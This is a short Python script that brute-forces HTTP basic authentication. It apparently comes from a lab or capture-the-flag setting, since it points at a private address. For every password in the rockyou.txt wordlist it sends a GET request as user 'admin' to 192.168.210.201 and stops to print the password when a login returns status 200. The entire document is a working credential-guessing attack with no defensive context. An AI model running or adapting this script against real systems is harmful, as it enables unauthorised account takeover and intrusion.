import requests
import os

username='admin'

def sendreq():
	count =0

	pass_file = open("/usr/share/wordlists/rockyou.txt", "r")
	 
	for line in pass_file:
		count = count + 1
		
		pword=line.replace('\n', '') #do not change
		auth_req = requests.request('GET', 'http://192.168.210.201', auth=(username, pword))
		
		if (auth_req.status_code == 200):
			print("[+] Status code 200 detected.", "The password is "+pword)
			print("Password was found in line "+str(count)+" of the wordlist")
			print("Exiting")
			quit()

sendreq()
